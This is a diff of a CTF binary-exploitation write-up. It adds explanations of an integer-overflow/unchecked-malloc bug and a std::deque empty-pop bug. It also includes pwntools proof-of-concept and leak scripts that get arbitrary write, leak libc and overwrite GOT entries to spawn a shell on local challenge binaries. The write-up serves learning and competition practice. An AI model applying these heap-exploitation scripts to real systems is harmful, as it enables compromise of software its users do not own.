@@ -33,6 +33,85 @@ TODO
 
 The classic interger overflow. Also malloc without the return value check and index check leads to arbitrary read/write.
 
+### vuln
+
+The array's init function is like this:
+```c
+void array_init(pkt_t *pkt) {
+  if (pkt->size > pkt->capacity)
+    pkt->size = pkt->capacity;
+
+  g_array.data = (int*)malloc(pkt->capacity * sizeof(int));
+  if (!g_array.data)
+    *(uint64_t*)pkt = 0;
+
+  g_array.size = pkt->size;
+  g_array.capacity = pkt->capacity;
+  g_array.initial = pkt->initial;
+
+  for (size_t i = 0; i < pkt->size; i++)
+    g_array.data[i] = pkt->initial;
+
+  printf("Initialized: size=%d capacity=%d\n", pkt->size, pkt->size);
+}
+```
+
+However, when looking at the decompiled code, part of it looks like this:
+```c
+  v1 = *pkt;
+  if ( pkt[1] > *pkt )
+    pkt[1] = v1;
+  data = (__int64)malloc(4LL * v1);
+  data_1 = (__m128i *)data;
+  if ( !data )
+    *(_QWORD *)pkt = 0;
+  size = pkt[1];
+  initial = pkt[2];
+  initial_1 = initial;
+  g_array = _mm_unpacklo_epi32(_mm_cvtsi32_si128(size), _mm_cvtsi32_si128(v1)).m128i_u64[0];
+```
+
+We can easily see that EVEN IF malloc fails, the size will be set to 0 but **capacity is still set to the user controlled value**. This means we can set a very large capacity, make malloc fail, and then assign the `g_array.capacity` to a very big number.
+
+```py
+p.send(p32(0xffffffff) + p32(3) + p32(0))
+```
+such is the poc to achieve this.
+
+From past challenges, we know that if we have non-checked malloc and index, we can achieve arbitrary read/write. See the [bph writeup](https://blog.rosay.xyz/qwb-2025-writeup/) here.
+
+Therefore, to get this non-checked index, we should use the resize functionality to set size to a very large number (negative number interpreted as a large unsigned number).
+
+```py
+p.send(p32(0xffffffff) + p32(3) + p32(0))
+p.recvuntil(b'Initialized')
+op(3, -2, 0x1337)
+p.recvuntil("New size set to -2\n")
+```
+
+After having arbitrary read/write, we can leak libc and do the classic _IO_file structure attack of house of apple 2.
+
+Leaking from the stdin structure:
+
+```py
+op(1, 0x0404050//4, 0)
+p.recvuntil("array[1052692] = ")
+libc_leak_lower = int(p.recvline().strip())
+if libc_leak_lower < 0:
+    libc_leak_lower += 2**32
+op(1, 0x0404050//4 + 1, 0)
+p.recvuntil("array[1052693] = ")
+libc_leak_upper = int(p.recvline().strip())
+
+libc_leak = (libc_leak_upper << 32) | libc_leak_lower
+log.info(f"libc leak: {hex(libc_leak)}")
+libc_base = libc_leak - libc.symbols["_IO_2_1_stdin_"]
+log.info(f"libc base: {hex(libc_base)}")
+
+```
+
+Finally, we exploit using house of apple 2 and it is done.
+
 ### exp
 ```py
 from pwn import *
@@ -116,9 +195,308 @@ Was doing this chal in my dorm and I was frustrated so I mumbled "Cursed" a bit 
 
 Did this cursed chal with dylanyang17 and jiegec.
 
-The idea is to spray the target addresses on heap. Use the map's reallocation to alloc on them. The deque's first maps will be placed in the middle of the allocated chunk and then we can use the "empty pop" to let the deque think of the sprayed target addresses as its map and we can do arbitrary write.
+### Initial primitive
 
-Will elaborate more later.
+The vulnerability is an "empty pop" of the stack, which is implemented in std::deque. By popping from an empty stack, we can trigger unintended behavior and all sort of stuffs.
+
+```c
+while (std::cin.good()) {
+    std::cin >> op;
+    if (op == 1) {
+      std::cin >> val;
+      S.push(val);
+    } else if (op == 2) {
+      S.pop();
+    } else if (op == 3) {
+      std::cin >> val;
+      T.push(val);
+    } else if (op == 4) {
+      T.pop();
+    } else {
+      break;
+    }
+  }
+```
+
+### getting a primitive THAT WORKS
+
+In a privious challenge [calc](https://blog.rosay.xyz/blackhat-mea-2025-writeup-pwn/) we can easily get heap underflow using the std::vector's empty pop. However, if we try the same thing here, it will dereference from a very low address (about 0x1f8 or such) and crash.
+
+```py
+pop(p, 2)
+pop(p, 2)
+pop(p, 2)
+push(p, 1, 0xdeadbeef)
+```
+
+To understand why, we need to look at the implementation of std::deque. Found a good resource [here](https://zhuanlan.zhihu.com/p/494261593).
+
+To make it brief, the std::deque is implemented as a list of fixed-size arrays (called nodes). The deque maintains a map (an array of pointers) that points to these nodes. Each node can hold a certain number of elements (64 in this case).
+
+I used claude to help me recover the structure of std::deque in this binary:
+
+```c
+
+template<typename T>
+class deque {
+    // Base class members
+    T** _M_map;              // offset +0:  pointer to map (array of chunk pointers)
+    size_t _M_map_size;      // offset +8:  size of the map array
+    
+    // Start iterator (offset +16 to +39, 24 bytes total)
+    struct {
+        T* _M_cur;           // offset +16: current element pointer
+        T* _M_first;         // offset +24: start of chunk
+        T* _M_last;          // offset +32: end of chunk
+        T** _M_node;         // offset +40: pointer to map entry
+    } _M_start;
+    
+    // Finish iterator (offset +48 to +71, 24 bytes total)
+    struct {
+        T* _M_cur;           // offset +48: current element pointer (end)
+        T* _M_first;         // offset +56: start of chunk
+        T* _M_last;          // offset +64: end of chunk
+        T** _M_node;         // offset +72: pointer to map entry
+    } _M_finish;
+};
+
+```
+
+Below is the analysis of what happens when we pop from an empty deque:
+```c
+__int64 __fastcall std::deque<unsigned long>::_M_pop_back_aux(_QWORD *a1)
+{
+  __int64 v2; // [rsp+18h] [rbp-28h]
+
+  std::_Deque_base<unsigned long>::_M_deallocate_node(a1, a1[7]);
+  std::_Deque_iterator<unsigned long,unsigned long &,unsigned long *>::_M_set_node(a1 + 6, a1[9] - 8LL);
+  a1[6] = a1[8] - 8LL;
+  v2 = a1[6];
+  ident_1(a1);
+  return v2;
+}
+```
+For the map, it deallocates the current node (chunk), then moves the finish iterator to the previous node in the map, and updates the current pointer accordingly. There is no check to see the previous node's validity.
+
+In the previous pop thrice push once example, after calling the _M_pop_back_aux, the previous node pointer is nullptr, so the current pointer becomes nullptr + offset, which is an invalid address and causes a crash when we try to push.
+
+Emmmm... How can we turn this into a useful primitive?
+
+There is one thing we noticed: The first node pointer is always at the center of the map, making it more space-friendly for both front and back pushes/pops. Also, during reallocation of the map, the chunk is not zeroed. This means that if we can reallocate the map to a larger size, and we can control the remaining content of where it allocated to, we can make the previous node pointer point to a controlled address. This idea is proposed by dylanyang17. tql!
+
+With this condition, we first constructs a very large string made of repeated target addresses. When the string length is large enough, there will be a reallocation during construction of the string. Therefore, we can get a big enough unsorted bin chunk with the content we control.
+
+Then we push enough times to trigger a map reallocation in std::deque. During the reallocation, the new map will alloc a chunk from our unsorted bin, and thus the previous node pointer will point to our controlled address. **When we do an empty pop, the current pointer will be set to our controlled address + offset.**
+
+When we push again, we can write to something like our controlled address + offset. With this, we can have an **arbitrary write primitive**.
+
+
+Here's the PoC. The times to trigger the map's reallocation is calculated by GPT 5.1.
+
+```py
+from pwn import *
+
+context(log_level="debug", arch="amd64", os="linux")
+
+target_addr = 0x0405008
+def start():
+    """Start the target process."""
+    return process("./st")
+
+
+def handshake(p):
+    """Send the initial name prompt."""
+    p.recvuntil(b"What's your name?\n")
+    p.sendline(p64(target_addr)*0x800)
+    p.recvuntil(b"!\n")
+
+
+def push(p, which, val):
+    """Push `val` onto stack S or T.
+
+    which = 1 -> push S
+    which = 3 -> push T
+    """
+    assert which in (1, 3)
+    p.sendline(str(which).encode())
+    p.sendline(str(val).encode())
+
+
+def pop(p, which):
+    """Pop from stack S or T.
+
+    which = 2 -> pop S
+    which = 4 -> pop T
+    """
+    assert which in (2, 4)
+    p.sendline(str(which).encode())
+
+
+def trigger_map_realloc():
+    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.
+
+    For std::deque<unsigned long> in this binary:
+      - Each node holds 64 elements.
+      - Initial _M_map_size = 8, with a single node centered at map[3].
+      - On every 64th push, when a node is full, push_back() calls
+        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
+      - While finish._M_node is at indices 3..6, there are enough map
+        slots at the back, so no reallocation occurs.
+      - When finish._M_node reaches index 7 and we try to create one more
+        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
+        (the current node) and calls _M_reallocate_map(), which in turn
+        calls _M_allocate_map() with a larger map size.
+
+    To get there starting from an empty deque we need 5 node-boundary
+    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
+    64th push for that node. So approximately 64 * 5 = 320 pushes on S
+    are enough to force a map reallocation.
+    """
+
+    p = start()
+    handshake(p)
+
+    log.info("Pushing enough elements on S to trigger map reallocation...")
+
+    # Push on S (op=1) enough times so that the 5th node transition
+    # forces _M_reserve_map_at_back to grow the map.
+
+    total_pushes = 64 * 5
+    for i in range(total_pushes):
+        push(p, 1, i)
+
+
+    for i in range(total_pushes + 64):
+        pop(p, 2)
+    push(p, 1, 0xdeadbeef)
+    gdb.attach(p)
+    pause()
+    # Keep the process alive so you can inspect it.
+    p.interactive()
+
+
+if __name__ == "__main__":
+    trigger_map_realloc()
+```
+
+It has the following effect:
+
+![alt_text](/assets/img/uploads/arb_write.webp)
+
+Thus, we have an arbitrary write primitive!
+
+### further exploitation
+
+I tried overwriting the operator delete got to system. Then when we free a chunk with "/bin/sh", we can get a shell. Theoretically it should work with a 1/4096 bruteforce, but it just didn't work for us.
+
+We need a libc leak. Through multiple iterations, jiegec and I came up with a brilliant idea using only two arbitrary write chances.
+
+1. AAW on S to point the `name`'s pointer to somewhere we can leak the libc address. 2. AAW on T to modify `operator delete@got` to 0x4013d5, when we cout << name we can get the libc address 3. After entering main again, pop and push on T to change the operator delete to point to system 4. pop and push on S to change the name's pointer to "/bin/sh" 5. pop on S twice, trigger the operator delete -> system("/bin/sh")
+
+### leak script
+
+```py
+from pwn import *
+
+context(arch="amd64", os="linux", log_level="debug")
+
+target_addr = 0x405300
+
+target_addr2 = 0x405040
+
+
+def start():
+    """Start the target process."""
+    return process("./st")
+
+
+def handshake(p):
+    """Send the initial name prompt."""
+    p.recvuntil(b"What's your name?\n")
+    p.sendline(p64(target_addr)*0x20 + p64(target_addr2)*0x7e0)
+    p.recvuntil(b"!\n")
+
+
+def push(p, which, val):
+    """Push `val` onto stack S or T.
+
+    which = 1 -> push S
+    which = 3 -> push T
+    """
+    assert which in (1, 3)
+    p.sendline(str(which).encode())
+    p.sendline(str(val).encode())
+
+
+def pop(p, which):
+    """Pop from stack S or T.
+
+    which = 2 -> pop S
+    which = 4 -> pop T
+    """
+    assert which in (2, 4)
+    p.sendline(str(which).encode())
+
+
+def trigger_map_realloc():
+    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.
+
+    For std::deque<unsigned long> in this binary:
+      - Each node holds 64 elements.
+      - Initial _M_map_size = 8, with a single node centered at map[3].
+      - On every 64th push, when a node is full, push_back() calls
+        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
+      - While finish._M_node is at indices 3..6, there are enough map
+        slots at the back, so no reallocation occurs.
+      - When finish._M_node reaches index 7 and we try to create one more
+        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
+        (the current node) and calls _M_reallocate_map(), which in turn
+        calls _M_allocate_map() with a larger map size.
+
+    To get there starting from an empty deque we need 5 node-boundary
+    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
+    64th push for that node. So approximately 64 * 5 = 320 pushes on S
+    are enough to force a map reallocation.
+    """
+
+    p = start()
+    handshake(p)
+
+    log.info("Pushing enough elements on S to trigger map reallocation...")
+
+    # Push on S (op=1) enough times so that the 5th node transition
+    # forces _M_reserve_map_at_back to grow the map.
+
+    total_pushes = 64 * 5
+
+    for i in range(total_pushes):
+        push(p, 1, i)
+
+    for i in range(total_pushes):
+        push(p, 3, i)
+
+    for i in range(total_pushes + 64):
+        pop(p, 2)
+
+
+    push(p, 1, 0x405078)
+    push(p, 1, 0x10)
+    
+    for i in range(total_pushes + 64):
+        pop(p, 4)
+    push(p, 3, 0x04013d5)
+    # gdb.attach(p)
+    # pause()
+    pop(p, 4)
+    pop(p, 4)
+    # Keep the process alive so you can inspect it.
+    p.interactive()
+
+
+if __name__ == "__main__":
+    trigger_map_realloc()
+```
+
 
 ### exp
 
@@ -242,7 +620,7 @@ if __name__ == "__main__":
 
 ```
 
-The final script that can work on remote, written by jiegec:
+The final script that can work on remote, written by jiegec. The change is to leak the libc address from `__libc_start_main` instead of `memmove@got`:
 ```py
 from pwn import *
 
@@ -374,3 +752,5 @@ if __name__ == "__main__":
 ## Cursed PQ
 
 What the heck am I supposed to do with heap arbitrary write, no leaks, restricted allocation size(so no house of water), and no partial overwrites. Out of ideas.
+
+Update: Crazyman hinted for using house of muney. Will check on it later.
